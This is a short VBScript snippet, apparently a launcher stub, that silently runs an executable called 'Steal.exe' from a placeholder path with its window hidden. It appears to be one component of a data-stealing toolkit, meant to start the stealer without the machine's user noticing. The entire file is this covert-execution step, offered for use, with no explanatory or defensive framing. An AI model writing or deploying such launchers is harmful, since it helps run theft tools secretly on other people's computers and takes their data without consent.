Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "<PATH of the executable>\Steal.exe" & Chr(34), 0
Set WinScriptHost = Nothing
